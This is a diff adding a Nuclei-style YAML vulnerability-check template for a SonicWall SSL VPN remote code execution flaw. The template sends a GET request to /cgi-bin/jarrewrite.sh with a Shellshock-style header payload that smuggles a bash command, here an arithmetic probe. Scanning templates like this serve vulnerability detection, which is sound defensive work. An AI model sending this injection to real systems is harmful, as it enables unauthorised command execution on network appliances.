@@ -1,0 +1,20 @@
+id: yaml-poc-sonicwall-ssl_vpn-rce-CT-158488
+info:
+  name: Yaml Poc Sonicwall Ssl_Vpn Rce Ct 158488
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-sonicwall-ssl_vpn-rce-CT-158488'
+  tags: sonicwall,rce
+  reference: []
+http:
+- method: GET
+  path:
+  - /cgi-bin/jarrewrite.sh
+  headers:
+    X-Test: () { :; }; echo ; /bin/bash -c 'expr {{r1}} - {{r2}}'
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
